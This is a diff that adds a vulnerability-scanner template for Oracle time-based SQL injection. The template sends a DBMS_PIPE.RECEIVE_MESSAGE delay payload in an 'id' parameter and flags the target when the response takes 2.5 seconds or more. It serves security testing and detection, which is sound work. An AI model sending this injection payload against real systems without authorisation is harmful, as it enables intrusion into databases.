@@ -1,0 +1,19 @@
+id: patt-sqli-ora-time-01-id
+name: 'PATT sqli patt-sqli-ora-time-01 via id'
+severity: high
+type: active
+tags:
+  - sqli
+  - patt
+requires:
+  - java
+description: 'PATT Oracle time-based DBMS_PIPE. [patt:patt-sqli-ora-time-01] [patt_source:https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/SQL%20Injection/OracleSQL%20Injection.md]'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      id:
+        - ''' AND 1=DBMS_PIPE.RECEIVE_MESSAGE(''a'',3)-- -'
+    matchers:
+      - type: time
+        ms: 2500
